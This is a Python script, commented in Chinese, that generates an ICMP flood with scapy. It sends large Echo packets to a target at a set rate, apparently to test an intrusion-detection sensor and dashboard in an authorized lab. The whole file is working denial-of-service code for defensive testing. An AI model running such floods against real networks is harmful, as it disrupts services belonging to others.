"""ICMP 洪泛复现（**仅限本人授权实验网段**）。

用大尺寸 ICMP Echo 制造高带宽的单向流量，用来验证探针在高包速下的表现
（流表淘汰、速率类特征失真）以及看板时序图能否立刻抬升。
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from attack.common import add_common_args, guard, pace, require_root  # noqa: E402


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="ICMP 洪泛（仅限授权实验网段）")
    add_common_args(ap)
    ap.add_argument("--size", type=int, default=1400, help="载荷字节数，上限 1472")
    args = ap.parse_args(argv)
    guard(ap, args)
    if args.size > 1472:
        ap.error("--size 上限 1472（1500 MTU 减去 20 字节 IP 头与 8 字节 ICMP 头）")
    require_root()

    from scapy.all import ICMP, IP, send

    payload = b"A" * args.size
    started = time.monotonic()
    sent = 0
    print(f"[PING] -> {args.target}　载荷 {args.size}B　速率 {args.rate}/s", flush=True)
    while time.monotonic() - started < args.duration:
        send(IP(dst=args.target) / ICMP() / payload, verbose=False)
        sent += 1
        pace(args.rate, sent, started)
    print(f"[PING] 完成，共发出 {sent} 个包（约 {sent * args.size / 1e6:.1f} MB 载荷）", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
